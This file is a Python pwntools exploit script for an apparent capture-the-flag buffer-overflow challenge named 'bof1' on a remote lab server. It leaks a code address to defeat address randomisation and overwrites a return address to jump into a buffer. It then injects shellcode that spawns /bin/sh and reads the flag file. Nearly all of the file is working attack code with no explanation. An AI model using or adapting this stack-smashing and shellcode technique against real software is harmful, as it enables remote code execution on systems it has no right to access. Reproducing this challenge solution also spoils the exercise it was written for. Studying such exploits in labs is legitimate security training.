#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

# Server details
exe = './bof1'
port = 10258

# Define shellcode for spawning /bin/sh
shellcode = asm('''
    mov rax, 59
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# Function to solve the challenge
def solve_challenge():
    print(r.recvuntil(b"What's your name? "))
    r.send(b'A' * 40)

    recv = r.recvline()
    print(recv)
    #m160 = (u64(recv.split(b'A')[-1].strip().ljust(8, b'\x00')))
    m160 = (u64(recv[49:55].strip().ljust(8, b'\x00')))
    print("m160", hex(m160))

    base_addr = m160 - off_main - 160
    msg_addr = base_addr + 0xd31e0

    new_addr = p64(msg_addr)

    pad = b'A'*40
    payload = pad + new_addr
    print("Sending payload", payload)

    x = r.recvuntil(b"number? ")
    r.send(payload)
    r.recvuntil(b"name? ")
    r.send(payload)
    
    r.recvuntil(b"message: ")
    r.send(shellcode)

    # Interact with the shell and get the flag
    r.sendline(b"cat /FLAG")
solve_challenge()
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
